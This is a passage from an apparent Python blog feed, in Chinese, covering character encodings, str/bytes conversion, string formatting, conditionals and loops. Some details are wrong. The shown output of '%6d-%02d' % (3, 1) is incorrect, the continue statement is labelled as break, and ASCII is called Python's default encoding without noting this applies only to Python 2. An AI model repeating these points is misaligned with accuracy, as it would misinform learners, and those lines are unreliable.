<h3 id="十一-文件系统"><a href="#十一-文件系统" class="headerlink" title="十一. 文件系统"></a><font color="#FF6347" face="Comic sans MS">十一. 文件系统</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-FileContents">Python-文件系统</a>]</strong></font><br></font></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-字符编码&amp;字符串&amp;格式化</title>
    <url>/post/Python-Coding/</url>
    <content><![CDATA[<p>字符编码、字符串(๑°⌓︎°๑) </p>
<span id="more"></span>

<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>Python-字符编码、字符串、格式化</font> </center>

<br>

<br>

<h3 id="一-字符编码"><a href="#一-字符编码" class="headerlink" title="一. 字符编码"></a><font color="#FF6347" face="Comic sans MS">一. 字符编码</font></h3><ol>
<li><p>我们已经讲过了，字符串也是一种数据类型，但是，<strong>字符串</strong>比较特殊的是还有一个<strong>编码</strong>问题。</p>
</li>
<li><p><font color="#FF7F00"><strong>因为计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理</strong></font>。最早的计算机在设计时采用8个比特（**<code>8 bit</code><strong>）作为一个字节（</strong><code>1 byte</code>**）。</p>
<ol>
<li>所以，**<code>一个字节</code><strong>能表示的最大的整数就是</strong><code>255</code>**（二进制11111111&#x3D;十进制255）；</li>
<li>如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是65535，**<code>4个字节</code><strong>可以表示的最大整数是</strong><code>4294967295</code>**。</li>
</ol>
</li>
<li><p>由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为<font color="#FF7F00"><strong>ASCII编码</strong></font>，比如大写字母<code>A</code>的编码是<code>65</code>，小写字母<code>z</code>的编码是<code>122</code>。</p>
</li>
<li><p>但是要处理中文显然一个字节是不够的，<strong>至少需要两个字节</strong>，而且还不能和ASCII编码冲突，所以，<font color="#FF7F00"><strong>中国制定了GB2312编码，用来把中文编进去</strong></font>。</p>
</li>
<li><p>你可以想得到的是，全世界有上百种语言，日本把日文编到<code>Shift_JIS</code>里，韩国把韩文编到<code>Euc-kr</code>里，各国有各国的标准，就会不可避免地出现冲突，结果就是，在多语言混合的文本中，显示出来会有乱码。</p>
</li>
<li><p>因此，<code>Unicode</code>应运而生。<font color="#FF7F00"><strong>Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了</strong></font>。</p>
</li>
<li><p>Unicode标准也在不断发展，但最常用的是<font color="#00B2EE"><strong>用两个字节表示一个字符</strong></font>（如果要用到非常偏僻的字符，就需要4个字节）。现代操作系统和大多数编程语言都直接支持Unicode。</p>
</li>
<li><p>现在，捋一捋ASCII编码和Unicode编码的区别：<font color="#00B2EE"><strong>ASCII编码是1个字节，而Unicode编码通常是2个字节</strong></font>。</p>
<ol>
<li>字母<code>A</code>用ASCII编码是十进制的<code>65</code>，二进制的<code>01000001</code>；</li>
<li>字符<code>0</code>用ASCII编码是十进制的<code>48</code>，二进制的<code>00110000</code>，注意字符’0’(‘零’)和整数0(零)是不同的；</li>
<li>汉字<code>中</code>已经超出了ASCII编码的范围，用Unicode编码是十进制的<code>20013</code>，二进制的<code>01001110 00101101</code>。</li>
<li>你可以猜测，如果<font color="red"><strong>把ASCII编码的A用Unicode编码，只需要在前面补0(零)就可以</strong></font>，因此，A的Unicode编码是00000000 01000001。</li>
</ol>
</li>
<li><p>新的问题又出现了：如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，<font color="#00B2EE"><strong>用Unicode编码比ASCII编码需要多一倍的存储空间</strong></font>，在存储和传输上就十分不划算。</p>
</li>
<li><p>所以，<strong>本着节约的精神</strong>，又出现了<font color="#00B2EE"><strong>把Unicode编码转化为“可变长编码”的UTF-8编码</strong></font>。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间：</p>
</li>
</ol>
<p>||||<br>:-:|:-:|:-:|:-:|<br>字符    |ASCII    |Unicode    |UTF-8<br>A    |1000001    |00000000 01000001    |01000001<br>中    |x            |01001110 00101101    |11100100 10111000 10101101</p>
<blockquote>
<ol>
<li>从上面的表格还可以发现，UTF-8编码有一个额外的好处，就是<font color="#FF7F00"><strong>ASCII编码实际上可以被看成是UTF-8编码的一部分</strong></font>，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作。</li>
</ol>
</blockquote>
<p><strong>总结一下现在计算机系统通用的字符编码工作方式：</strong></p>
<ol>
<li><font color="#FF7F00"><strong>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码</strong></font>。</li>
<li>举例：用记事本编辑(计算机内存中)的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8(保存到文件硬盘或者需要传输)</li>
</ol>
<br>


<p>PS：所以你看到很多网页的源码上会有类似<code>&lt;meta charset=&quot;UTF-8&quot; /&gt;</code>的信息，表示该网页正是用的UTF-8编码。</p>
<br>

<br>

<h3 id="二-代码编码和文件编码的设置"><a href="#二-代码编码和文件编码的设置" class="headerlink" title="二. 代码编码和文件编码的设置"></a><font color="#FF6347" face="Comic sans MS">二. 代码编码和文件编码的设置</font></h3><blockquote>
<p><strong>Python中默认的编码格式是 ASCII 格式，在没修改编码格式时无法正确打印汉字，所以在读取中文时会报错。</strong><br>解决方法为只要在文件开头加入<code># -*- coding: UTF-8 -*-</code> 或者 <code>#coding=utf-8</code> 就行了<br>（<strong>注意：</strong><code>#coding=utf-8</code> 的 <code>=</code> 号两边不要空格。）</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;你好，世界&quot;</span>;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">你好，世界</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong></p>
</blockquote>
<ol>
<li>Python3.X 源码文件默认使用utf-8编码，所以可以正常解析中文，无需指定 UTF-8 编码。</li>
<li>注意：如果你使用编辑器，同时需要设置 py 文件存储的格式为 UTF-8</li>
</ol>
<br>

<br>

<h3 id="三-字符与编码的转换"><a href="#三-字符与编码的转换" class="headerlink" title="三. 字符与编码的转换"></a><font color="#FF6347" face="Comic sans MS">三. 字符与编码的转换</font></h3><p>在最新的Python 3版本中，<font color="#FF7F00"><strong>字符串是以Unicode编码的</strong></font>，也就是说，Python的字符串支持多语言（字符串可以写任意国家文字）。</p>
<br>

<h4 id="3-1-字符与十进制编码的转换"><a href="#3-1-字符与十进制编码的转换" class="headerlink" title="3.1 字符与十进制编码的转换"></a><font color="#3CB371" face="Comic sans MS">3.1 字符与十进制编码的转换</font></h4><blockquote>
<p><strong>使用函数：</strong></p>
</blockquote>
<ol>
<li>ord()：将字符转换成其对应的整数（十进制），注意不是字符串；</li>
<li>chr()：将十进制整数转换成其对应的字符。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">b=<span class="built_in">chr</span>(<span class="number">120</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">65</span> </span><br><span class="line">x </span><br></pre></td></tr></table></figure>



<br>

<h4 id="3-2-不同编码之间的转换"><a href="#3-2-不同编码之间的转换" class="headerlink" title="3.2 不同编码之间的转换"></a><font color="#3CB371" face="Comic sans MS">3.2 不同编码之间的转换</font></h4><p>由于Python的字符串类型是str，<font color="#FF7F00"><strong>在内存中以Unicode表示，一个字符对应若干个字节</strong></font>。如果要在网络上传输，或者保存到磁盘上，就需要<font color="#FF7F00"><strong>把str变为以字节为单位的bytes</strong></font>。</p>
<p>Python对bytes类型的数据用带<code>b前缀</code>的<font color="#FF7F00"><strong>单引号</strong></font>或<font color="#FF7F00"><strong>双引号</strong></font>表示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">b&#x27;ABC&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span> </span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong>要注意区分’ABC’和b’ABC’，前者是str，后者虽然内容显示得和前者一样，但<font color="#FF7F00"><strong>bytes的每个字符都只占用一个字节</strong></font>。</p>
</blockquote>
<br>


<p><font color="#00B2EE" face="Comic sans MS"><strong>不同编码之间的转换使用函数：</strong></font></p>
<ol>
<li><strong>decode()：</strong> 解码，将其他编码的字符串解码成unicode编码；</li>
<li><strong>encode()：</strong> 转码，将unicode编码的字符串转码成其他编码。</li>
<li><strong>decode(“utf-8”, errors&#x3D;”ignore”) ：</strong> 忽略其中有异常的编码，仅显示有效的编码；</li>
<li><strong>decode(“utf-8”, errors&#x3D;”replace”)：</strong> 替换其中异常的编码，这个相对来可能一眼就知道那些字符编码出问题了；</li>
<li><strong>len()：</strong> 计算的是str的字符数，如果换成bytes，len()函数就计算字节数。</li>
</ol>
<br>

<p>资料查阅：<font color="#00B2EE">[<a href="https://blog.csdn.net/xw_classmate/article/details/51934723">Python中的编码（encode）与解码（decode）程</a>]</font></p>
<br>

<p>字符串在Python内部的表示是unicode编码，因此，在做编码转换时，通常需要以unicode作为<font color="#FF7F00"><strong>中间编码</strong></font>，即先将其他编码的字符串解码（<code>decode</code>）成unicode，再从unicode编码（<code>encode</code>）成另一种编码。</p>
<br>

<p>举例1：以Unicode表示的str通过<code>encode()</code>方法可以编码为指定的bytes</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ABC&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span> </span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span> </span><br><span class="line">Traceback (most recent call last): </span><br><span class="line">  File <span class="string">&quot;C:\Users\Alvin\AppData\Local\Temp\learn_python_q5t__kzk_py\test_21.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)) </span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128) </span></span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>第三个输出报错是因为含有中文的str无法用ASCII编码，因为中文编码的范围超过了ASCII编码的范围，Python会报错。</p>
</blockquote>
<br>

<p>举例2：以Unicode表示的str通过<code>encode()</code>方法可以编码为指定的bytes    </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;ABC&#x27;</span>.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">ABC </span><br><span class="line">中文 </span><br><span class="line">Traceback (most recent call last): </span><br><span class="line">  File <span class="string">&quot;C:\Users\Alvin\AppData\Local\Temp\learn_python_q5t__kzk_py\test_22.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)) </span><br><span class="line">UnicodeDecodeError: <span class="string">&#x27;utf-8&#x27;</span> codec can<span class="string">&#x27;t decode byte 0xff in position 3: invalid start byte </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>第三个输出报错是因为bytes中包含无法解码的字节，decode()方法会报错。</p>
</blockquote>
<br>

<p>举例3：如果bytes中只有一小部分无效的字节，可以传入<code>errors=&#39;ignore&#39;</code>忽略错误的字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;中&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">中 </span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad&#x27;</span> </span><br><span class="line">中 </span><br></pre></td></tr></table></figure>

<br>

<p>举例4：<code>len()</code>函数计算的是str的字符数，如果换成bytes，len()函数就计算字节数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;ABC&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;中文&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">b&#x27;ABC&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">6</span> </span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<ol>
<li>可见，1个中文字符经过UTF-8编码后通常<font color="#FF7F00"><strong>会占用3个字节，而1个英文字符只占用1个字节</strong></font>。</li>
<li>在操作字符串时，我们经常遇到str和bytes的互相转换。<font color="#FF7F00"><strong>为了避免乱码问题，应当始终坚持使用UTF-8编码对str和bytes进行转换</strong></font>。</li>
</ol>
</blockquote>
<br>

<br>

<h3 id="四-格式化"><a href="#四-格式化" class="headerlink" title="四. 格式化"></a><font color="#FF6347" face="Comic sans MS">四. 格式化</font></h3><blockquote>
<p><font color="#FF7F00"><strong>重要总结：</strong></font></p>
</blockquote>
<ol>
<li>一个常见的问题是如何输出格式化的字符串。<ol>
<li>我们经常会输出类似”亲爱的<code>xxx</code>你好！你<code>xx</code>月的话费是<code>xx</code>，余额是<code>xx</code>“之类的字符串，而<code>xxx</code>的内容都是根据变量变化的，所以，需要一种简便的格式化字符串的方式。</li>
</ol>
</li>
<li>在Python中，采用的格式化方式和C语言是一致的，用<font color="#FF7F00"><strong>%</strong></font>实现。</li>
<li>%运算符就是用来格式化字符串的。在字符串内部，%s表示用字符串替换，%d表示用整数替换，有几个%?占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个%?，括号可以省略。</li>
<li>格式化整数还可以指定<font color="#FF7F00"><strong>是否补0和整数</strong></font>；浮点数可以指定<font color="#FF7F00"><strong>小数的位数</strong></font>。</li>
<li>要输出%，用%对其进行转义，即用%%来表示一个%。</li>
<li>另一种格式化字符串的方法是使用字符串的<font color="#FF7F00"><strong>format()方法</strong></font>，它会用传入的参数依次替换字符串内的占位符{0}、{1}……，不过这种方式写起来比%要麻烦得多</li>
</ol>
<br>

<p>常见的占位符有：</p>
<table>
<thead>
<tr>
<th align="center">占位符</th>
<th align="center">替换内容</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%d</td>
<td align="center">整数</td>
</tr>
<tr>
<td align="center">%f</td>
<td align="center">浮点数</td>
</tr>
<tr>
<td align="center">%s</td>
<td align="center">字符串</td>
</tr>
<tr>
<td align="center">%x</td>
<td align="center">十六进制整数</td>
</tr>
</tbody></table>
<br>

<p>示例代码：（里面的“&#x2F;&#x2F;”并不代表注释符）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;Hello, %s&#x27;</span> % <span class="string">&#x27;world&#x27;</span>    // 替换一个不使用括号</span><br><span class="line">b = <span class="string">&#x27;Hi, %s, you have $%d.&#x27;</span> % (<span class="string">&#x27;Michael&#x27;</span>, <span class="number">1000000</span>)   // 替换多个使用括号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;%6d-%02d&#x27;</span> % (<span class="number">3</span>, <span class="number">1</span>)  //  %6d  表示输出<span class="number">3</span>之前有（<span class="number">6</span>-<span class="number">1</span>）个空格输出</span><br><span class="line">                         //  %05d 表示输出<span class="number">1</span>之前有（<span class="number">5</span>-<span class="number">1</span>）个<span class="number">0</span>输出</span><br><span class="line">d = <span class="string">&#x27;%.2f&#x27;</span> % <span class="number">3.145926</span>    //  %<span class="number">.2</span>f 表示输出的浮点数保留两位小数，第三位小数&gt;=<span class="number">5</span>就向前进<span class="number">1</span></span><br><span class="line">e = <span class="string">&#x27;growth rate: %d %%&#x27;</span> % <span class="number">7</span>   //  转义，用%%表示一个%输出</span><br><span class="line">f=<span class="string">&#x27;Hello, &#123;0&#125;, 成绩提升了 &#123;1:.1f&#125;%&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;小明&#x27;</span>, <span class="number">17.125</span>)</span><br><span class="line">                         //  使用字符串<span class="built_in">format</span>()方法，注意括号里面的<span class="number">1</span>的意义</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Hello, world </span><br><span class="line">Hi, Michael, you have $<span class="number">1000000.</span> </span><br><span class="line">     <span class="number">3</span>-000000001 </span><br><span class="line"><span class="number">3.15</span></span><br><span class="line">growth rate: <span class="number">7</span> % </span><br><span class="line">Hello, 小明, 成绩提升了 <span class="number">17.1</span>% </span><br></pre></td></tr></table></figure>

<br>

]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-条件语句与循环</title>
    <url>/post/Python-ConditionalStatements-loops/</url>
    <content><![CDATA[<p>记得冒号和换行的缩进呀…(｡◕︎‿◕︎)ﾉﾟ･ﾟ･</p>
<span id="more"></span>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>条件语句与循环</font> </center>

<br>

<br>

<h3 id="一-条件语句"><a href="#一-条件语句" class="headerlink" title="一. 条件语句"></a><font color="#FF6347" face="Comic sans MS">一. 条件语句</font></h3><br>

<ol>
<li><p>if-else-elif是条件语句，判断bool类型，判断为True就继续执行后面的缩进语句，判断为Flase则不执行缩进语句。</p>
</li>
<li><p>Python程序语言指定任何非0和非空（Null）值为True，0 或者 null为False。</p>
</li>
<li><p>Python<font color="#FF7F00"><strong>只执行if-elif-else 结构中的一个代码块</strong></font>，它依次检查每个条件测试，直到遇到通过了的条件测试。测试通过后，Python将执行紧跟在它后面的代码，并跳过余下的测试。</p>
</li>
<li><p>python 并<font color="#FF7F00"><strong>不支持 switch 语句</strong></font>，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。</p>
</li>
<li><p>设置if 语句的格式。在条件测试的格式设置方面，PEP 8提供的唯一建议是，在诸如&#x3D;&#x3D; 、&gt;&#x3D; 和&lt;&#x3D; 等比较运算符两边各添加一个空格，例如，<code>if age &lt; 4:</code> 要比<code>if age&lt;4:</code> 好。这样的空格不会影响Python对代码的解读，而只是让代码阅读起来更容易。</p>
</li>
<li><p>注意条件语句如果有多条缩进语句时<font color="#FF7F00"><strong>不能忘了冒号（ <code>:</code> ）</strong></font>，不像C语言或其它语言一样，if后面没有括号。</p>
</li>
</ol>
<br>

<p>书写格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> &lt;条件判断<span class="number">1</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">1</span>&gt;</span><br><span class="line"><span class="keyword">elif</span> &lt;条件判断<span class="number">2</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">2</span>&gt;</span><br><span class="line"><span class="keyword">elif</span> &lt;条件判断<span class="number">3</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">3</span>&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;执行<span class="number">4</span>&gt;</span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="二-循环语句"><a href="#二-循环语句" class="headerlink" title="二. 循环语句"></a><font color="#FF6347" face="Comic sans MS">二. 循环语句</font></h3><br>

<p>Python提供了for循环和while循环（在Python中<strong>没有do..while循环</strong>）:</p>
<table>
<thead>
<tr>
<th align="center">循环类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-while-loop.html">while 循环</a></font></td>
<td align="left">在给定的判断条件为 true 时执行循环体，否则退出循环体。</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-for-loop.html">for 循环</a></font></td>
<td align="left">重复执行语句</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-nested-loops.html">嵌套循环</a></font></td>
<td align="left">你可以在while循环体中嵌套for循环</td>
</tr>
</tbody></table>
<br>

<p><strong>循环控制语句</strong><br>循环控制语句可以更改语句执行的顺序。Python支持以下循环控制语句：</p>
<table>
<thead>
<tr>
<th align="center">循环类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-break-statement.html">break 语句</a></font></td>
<td align="left">在语句块执行过程中终止循环，并且跳出整个循环</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-continue-statement.html">continue 语句</a></font></td>
<td align="left">在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。</td>
</tr>
<tr>
<td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-pass-statement.html">pass 语句</a></font></td>
<td align="left">pass是空语句，是为了保持程序结构的完整性。</td>
</tr>
</tbody></table>
<br>

<h4 id="2-1-While-循环语句"><a href="#2-1-While-循环语句" class="headerlink" title="2.1 While 循环语句"></a><font color="#3CB371" face="Comic sans MS">2.1 While 循环语句</font></h4><p>执行语句可以是单个语句或语句块。判断条件可以是任何表达式，任何非零、或非空（Null）的值均为True。当判断条件假False时，循环结束。其基本形式为（<strong>注意并没有括号</strong>）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 判断条件：</span><br><span class="line">    执行语句……</span><br></pre></td></tr></table></figure>

<br>

<p>Gif 演示 Python while 语句执行过程：</p>
<p><img data-src="https://i.loli.net/2019/03/01/5c789f82d8f65.gif" alt="loop-over-python-list-animation.gif"></p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>循环使用 else 语句：</strong></font></p>
<p>在 python 中，while … else 在循环条件为 False 时执行 else 语句块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">   <span class="built_in">print</span> (count, <span class="string">&quot; is  less than 5&quot;</span>)</span><br><span class="line">   count = count + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> (count, <span class="string">&quot; is not less than 5&quot;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">0</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">1</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">2</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">3</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">4</span>  <span class="keyword">is</span>  less than <span class="number">5</span> </span><br><span class="line"><span class="number">5</span>  <span class="keyword">is</span> <span class="keyword">not</span> less than <span class="number">5</span> </span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="2-2-for-in-语句"><a href="#2-2-for-in-语句" class="headerlink" title="2.2 for..in 语句"></a><font color="#3CB371" face="Comic sans MS">2.2 for..in 语句</font></h4><ol>
<li><p>Python for循环可以遍历任何序列的项目，如一个<font color="#FF7F00"><strong>列表</strong></font>或者一个<font color="#FF7F00"><strong>字符串</strong></font>。</p>
</li>
<li><p>Python 中的 for 语句和 C 或 Pascal 中的略有不同。通常的循环可能会依据一个等差数值步进过程（如 Pascal），或由用户来定义迭代步骤和中止条件（如 C ），Python 的 for 语句依据任意序列（列表或字符串）中的子项，按它们在序列中的顺序来进行迭代。</p>
</li>
<li><p>在迭代过程中修改迭代序列不安全（只有在使用列表这样的可变序列时才会有这样的情况）。如果你想要修改你迭代的序列（例如，复制选择项），你可以迭代它的复本。使用切割标识就可以很方便的做到这一点</p>
</li>
</ol>
<br>

<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>for…in语句处理字符串和列表不同：</strong></font></p>
</blockquote>
<ol>
<li><strong>处理列表：</strong><font color="#FF7F00"><strong>每次取列表的一个元素赋给 in 前面的变量</strong></font>；</li>
<li><strong>处理字符串：</strong><font color="#FF7F00"><strong>每次取字符串的一个字符赋给 in 前面的变量</strong></font>；</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;beauty&#x27;</span>:</span><br><span class="line">     <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> </span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">4</span> </span><br><span class="line"><span class="number">5</span> </span><br><span class="line"><span class="number">6</span> </span><br><span class="line">b </span><br><span class="line">e </span><br><span class="line">a </span><br><span class="line">u </span><br><span class="line">t </span><br><span class="line">y </span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p><font color="#FF7F00"><strong>上例列表 for x in …循环就是把每个元素代入变量x，然后执行缩进块的语句。这就像把序列中的每一个数(或对象)分配给x，一次一个,然后为每个x值执行语句块。</strong></font></p>
</blockquote>
<br>

<h4 id="2-2-break、continue、pass-语句"><a href="#2-2-break、continue、pass-语句" class="headerlink" title="2.2 break、continue、pass 语句"></a><font color="#3CB371" face="Comic sans MS">2.2 break、continue、pass 语句</font></h4><p><font color="#FF7F00"><strong>break语句：</strong></font> 在循环中，可以提前退出循环。<br><font color="#FF7F00"><strong>break语句：</strong></font> 在循环过程中，跳过当前的这次循环，直接开始下一次循环。<br><font color="#FF7F00"><strong>pass语句：</strong></font> pass 是空语句，是为了保持程序结构的完整性。pass 不做任何事情，一般用做占位语句。</p>
<br>    

<p>Python 语言 pass 语句语法格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 输出 Python 的每个字母</span></span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">&#x27;Python&#x27;</span>:</span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;这是 pass 块&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;当前字母 :&#x27;</span>, letter)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Good bye!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">当前字母 : P </span><br><span class="line">当前字母 : y </span><br><span class="line">当前字母 : t </span><br><span class="line">这是 <span class="keyword">pass</span> 块 </span><br><span 